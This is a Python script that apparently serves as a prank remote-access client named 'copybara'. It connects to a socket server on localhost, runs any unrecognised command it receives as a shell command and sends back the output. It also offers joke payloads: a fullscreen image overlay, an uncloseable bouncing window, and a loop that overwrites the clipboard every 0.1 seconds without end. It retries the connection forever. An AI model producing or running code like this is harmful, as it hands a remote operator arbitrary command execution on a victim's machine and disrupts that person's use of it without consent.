import socket
import subprocess
import threading
import pyperclip
import time
import tkinter as tk
from PIL import Image, ImageTk


def connect():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("127.0.0.1", 5555))
    failsafe = 0
    while failsafe < 20:
        command = s.recv(4096).decode()
        if command == "info":
            s.send("copybarav2 help gort bounce copybara".encode("utf-8"))
        elif command == "help":
            help_text = """Available commands:\n
					  help - Display this help message\n
					  gort - Summons Gort \n
					  bounce - Makes an un-closeable bouncing rodent \n
					  copybara - Permenantly render the clipboard unusable"""
            s.send(help_text.encode("utf-8"))   
        elif command == "gort":
            gthread = threading.Thread(target=window)
            gthread.start()
            s.send("GORT IS HERE".encode("utf-8"))
        elif command == "bounce":
            bthread = threading.Thread(target=bounce)
            bthread.start()
            s.send("Triggered Bounce".encode("utf-8"))
        elif command == "copybara":
            cthread = threading.Thread(target=clipboard)
            cthread.start()
            s.send("Coconut Doggo".encode("utf-8"))
        else:
            output = subprocess.getoutput(command)
            s.send(output.encode("utf-8"))
        if command == "":
            failsafe += 1
        else:
            failsafe = 0
    s.close()

def window():
    def onClosing():
        pass
    #pil_img = pil_img.resize((300, 200), Image.LANCZOS)
    box =tk.Tk()
    box.attributes('-topmost', False)
    box.attributes('-fullscreen', True)
    box.attributes('-alpha', 0.6)
    box.protocol("delete", onClosing())
    box.overrideredirect(True)
    img = Image.open('gort.png')
    img = ImageTk.PhotoImage(img)
    label =tk.Label(box, image=img)
    label.pack(expand=True)
    box.mainloop()

def bounce():
    box = tk.Tk()
    box.overrideredirect(True)  # borderless window (optional)
    box.configure(bg="black")
    win_w, win_h = 594, 646
    screen_w = box.winfo_screenwidth()
    screen_h = box.winfo_screenheight()
    state = {"x": 100, "y": 100, "dx": 3, "dy": 3}
    img = Image.open('rodent.png')
    img = ImageTk.PhotoImage(img)
    box.attributes('-topmost', True)
    label = tk.Label(box, image=img)
    label.pack(expand=True)
    def move():
        # update position
        state["x"] += state["dx"]
        state["y"] += state["dy"]
        # bounce off left/right
        if state["x"] <= 0 or state["x"] + win_w >= screen_w:
            state["dx"] = -state["dx"]
        # bounce off top/bottom
        if state["y"] <= 0 or state["y"] + win_h >= screen_h:
            state["dy"] = -state["dy"]
        # move window
        box.geometry(f"{win_w}x{win_h}+{state['x']}+{state['y']}")
        box.after(20, move)  # schedule next frame
    move()
    box.mainloop()

def clipboard():
    while True:
        pyperclip.copy("Capybara? Capybara! Coconut Doggo!")
        time.sleep(0.1)

if __name__ == "__main__":
    while True:
        try:
            connect()
        except Exception as e:
            time.sleep(5)